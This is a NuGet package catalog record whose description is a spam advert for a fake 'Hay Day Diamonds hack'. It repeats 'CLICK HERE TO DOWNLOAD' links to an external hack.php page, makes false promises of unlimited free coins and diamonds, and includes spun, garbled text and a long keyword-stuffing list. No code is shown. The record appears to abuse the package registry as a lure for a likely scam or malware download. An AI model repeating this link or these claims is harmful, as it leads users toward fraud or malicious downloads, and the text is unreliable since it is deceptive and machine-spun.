{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.16.47.43/_hay-day-diamonds-hack-working-2022-version-snk.3.6.34.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "b15e22d2-aba4-4997-8b64-3ddde6a2320a",
  "catalog:commitTimeStamp": "2022-01-26T16:47:43.7100933Z",
  "created": "2022-01-26T16:45:39.177Z",
  "description": "# _Hay Day Diamonds hack Working 2022 Version snk\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://12.bltadwin.ru/hack.php](http://12.bltadwin.ru/hack.php)\n\n\nHow to Get Free Diamonds and Coins In Hay Day · The very first tip is to keep an eye out for mystery red toolboxes loitering around your farm and. Why does this Hay Day cheat get a large amount of coins for There is a Tom booster card for players to hire Tom without paying diamonds. If you wanna have unlimited coins, diamonds, vouchers, gift cards, and puzzle pieces, then get the hay day hack mod.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://12.bltadwin.ru/hack.php](http://12.bltadwin.ru/hack.php)\n\nThe Hack for Hay Day is encouraging the functioning systems iOS and Android. Utilizing the Hay Day Hack apk is your best way to get infinite Diamonds and . In this Hay Day tutorial, you will learn how to hack Hay Day to get free Coins and Diamonds in Hay Day game. This Hay Day mod was released by us in and it allows all players that play on iOS and Android or Windows to get free Coins and Diamonds. The Pain of Hay Day Hack Hay Day Hack for Diamonds There is an arrangement of deceives you may use to hack the scope of precious stones in Hay Day. Additionally, you may utilize our Hacks for limitless amount of times! There are techniques to get more precious stones and maybe even free jewels. To Hack Hay Day For Free And Get Free Diamonds Just Click The .\n\nhay day diamonds hack mod apk, hay day diamonds hack apk, hay day diamond hack 2020, hay day diamond hack 2021, hay day diamond hack no verification, hay day diamond hack online, hay day diamond hack ios, hay day diamond hacker, hay day diamond hack android apk, hay day diamond hack apk mod, hay day hack diamonds and coins, hay day hack diamonds and coins free, hay day unlimited coins and diamonds hack apk, hay day unlimited coins and diamonds hack 2021, hay day hack unlimited coins and diamonds download, hay day free diamonds hack, hay day diamond cheat, hay day money and diamond hack, hay day hack diamonds coins, hay day hack diamonds and coins android, hay-day-hack-cheats-diamonds-coins, hay day hack cheats unlimited free diamonds, diamond hack for hay day, hay day coins and diamonds hack free download, hay day hack unlimited coins and diamonds apk download, hay day hack free diamonds and coins, hay day hack for diamonds, hay day hack unlimited coins and diamonds for android apk, hay day hack unlimited coins and diamonds for android, hack hay day diamonds generator, hay day game diamond hack, hay day hack to get diamonds, how to hack hay day diamonds, how to get unlimited diamonds in hay day, hay day hack apk unlimited diamonds, hay day hack money and diamonds, how to get free diamonds on hay day without human verification, hay day diamond hack, is there a real hack for hay day, hay day diamond ring cheat, how to earn diamonds on hay day, how to hack diamonds in hay day, hay day diamond cheat without survey, is hay day free, hay day hack diamonds unlimited, hay day hack unlimited diamonds coins online generator, hay day hack unlimited coins and diamonds ios, unlimited diamonds on hay day, free diamonds on hay day, hay day how to get diamonds, how to hack hay day 2020, hay day get diamonds, diamond hack hay day",
  "id": "_Hay-Day-Diamonds-hack-Working-2022-Version-snk",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T16:47:39.427Z",
  "listed": true,
  "packageHash": "MEVdlg3vsXBbMm0YT4XUUQf2mSO9y4equrHpdsJ+sK0O2AMpJnVZ/RihK7gBJ00auiP4NZp04oamzp5PJRfrqg==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11366,
  "published": "2022-01-26T16:45:39.177Z",
  "requireLicenseAcceptance": false,
  "title": "_Hay-Day-Diamonds-hack-Working-2022-Version-snk",
  "verbatimVersion": "3.6.34",
  "version": "3.6.34",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.16.47.43/_hay-day-diamonds-hack-working-2022-version-snk.3.6.34.json#hznflhczia.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1236,
      "fullName": "hznflhczia.nuspec",
      "length": 3764,
      "name": "hznflhczia.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.16.47.43/_hay-day-diamonds-hack-working-2022-version-snk.3.6.34.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9470,
      "fullName": ".signature.p7s",
      "length": 9470,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}